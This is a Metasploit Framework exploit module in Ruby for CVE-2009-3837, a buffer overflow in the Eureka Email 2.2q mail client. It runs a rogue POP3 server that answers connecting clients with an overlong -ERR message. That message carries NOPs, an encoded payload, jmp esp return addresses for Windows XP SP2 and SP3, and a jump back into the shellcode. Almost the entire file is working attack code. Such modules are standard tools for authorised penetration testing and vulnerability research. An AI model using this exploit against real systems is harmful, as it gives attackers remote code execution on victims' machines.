##
# $Id: eureka_mail_err.rb 10150 2010-08-25 20:55:37Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::TcpServer

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Eureka Email 2.2q ERR Remote Buffer Overflow Exploit',
			# bof occurs due to wsprintfA @ 0x43bdf2 in "Eureka Mail.exe" v2.2.0.1
			# overflows a buffer of 512 bytes, smashes a buffer of 256 bytes, then the return address
			'Description'    => %q{
				This module exploits a buffer overflow in the Eureka Email 2.2q
				client that is triggered through an excessively long ERR message.

				NOTE: this exploit isn't very reliable. Unfortunately reaching the
				vulnerable code can only be done when manually checking mail (Ctrl-M).
				Checking at startup will not reach the code targeted here.
			},
			'Author' 	 =>
				[
					'Francis Provencher (Protek Research Labs)',
					'Dr_IDE',
					'dookie',
					'jduck'
				],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 10150 $',
			'References'     =>
				[
					[ 'CVE', '2009-3837' ],
					[ 'OSVDB', '59262 ' ],
					[ 'URL', 'http://www.exploit-db.com/exploits/10235' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 700,
					'BadChars' => "\x00\x0a\x0d\x20",
					'StackAdjustment' => -3500,
					'PrependEncoder' => "\x81\xc4\xff\xef\xff\xff\x44",
					'DisableNops' => true,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Win XP SP3 English',	{ 'Ret' => 0x7E429353 } ], # jmp esp / user32.dll
					[ 'Win XP SP2 English', { 'Ret' => 0x77D8AF0A } ], # jmp esp / user32.dll
				],
			'Privileged'     => false,
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Oct 22 2009'
			))

		register_options(
			[
				OptPort.new('SRVPORT', [ true, "The POP3 daemon port to listen on", 110 ]),
			], self.class)
	end

	def on_client_connect(client)
		return if ((p = regenerate_payload(client)) == nil)

		# the offset to eip depends on the local ip address string length...
		already = "Your POP3 server had a problem.\n"
		already << datastore['LHOST']
		already << " said:\n\n    -ERR "
		space = (512+256+4) - already.length

		buffer =  "-ERR "
		buffer << make_nops(space - payload.encoded.length)
		buffer << payload.encoded
		buffer << [target.ret].pack('V')
		buffer << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-0x2c0").encode_string
		buffer << "\r\n"

		print_status("Sending exploit to #{client.peerhost}:#{client.peerport}...")
		client.put(buffer)

		handler
		service.close_client(client)
	end

end